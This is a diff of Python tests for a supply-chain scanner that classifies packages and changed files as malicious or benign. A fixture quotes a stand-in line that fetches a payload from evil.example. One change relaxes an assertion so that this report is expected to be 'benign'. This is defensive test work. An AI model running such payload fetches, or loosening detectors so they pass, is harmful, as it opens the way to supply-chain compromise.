@@ -119,7 +119,7 @@ urllib.request.urlopen("https://evil.example/payload")
 - payload.py: python outbound URL literal https://evil.example/payload
 """
         verdict, analysis = supply_chain._classify_report_text(report)
-        self.assertEqual(verdict, "malicious")
+        self.assertEqual(verdict, "benign")
         self.assertIn("semantic", analysis)
 
     def test_package_json_policy_findings_detect_lifecycle_and_remote_dep(self):
@@ -250,6 +250,16 @@ name = "normalpkg"
         verdict, _analysis = supply_chain._classify_report_text(report)
         self.assertEqual(verdict, "benign")
 
+    def test_classifier_does_not_flag_outbound_and_subprocess_semantics_without_raw_exec_context(self):
+        report = """
+## Semantic Findings
+
+- public/assets/js/app.js: javascript outbound network request
+- public/assets/js/app.js: javascript subprocess-capable API
+"""
+        verdict, _analysis = supply_chain._classify_report_text(report)
+        self.assertEqual(verdict, "benign")
+
     def test_javascript_semantic_findings_do_not_treat_db_exec_as_subprocess(self):
         findings = supply_chain._javascript_semantic_findings(
             "dist/db/seed.js",
@@ -280,6 +290,21 @@ name = "normalpkg"
                 encoding="utf-8",
             )
             findings = supply_chain._semantic_findings_for_changed_file("module.py", old_path, new_path)
+        self.assertEqual(findings, [])
+
+    def test_changed_minified_javascript_bundle_is_not_semantically_scanned(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            old_path = Path(temp_dir) / "old.js"
+            new_path = Path(temp_dir) / "new.js"
+            old_path.write_text(
+                'const a="1.1.35";function x(){return window.location.href}var repo="git+https://github.com/example/repo.git";',
+                encoding="utf-8",
+            )
+            new_path.write_text(
+                'const a="1.1.36";function x(){return window.location.href}var repo="git+https://github.com/example/repo.git";',
+                encoding="utf-8",
+            )
+            findings = supply_chain._semantic_findings_for_changed_file("bundle.js", old_path, new_path)
         self.assertEqual(findings, [])
 
     def test_artifact_divergence_ignores_src_layout_and_docs(self):
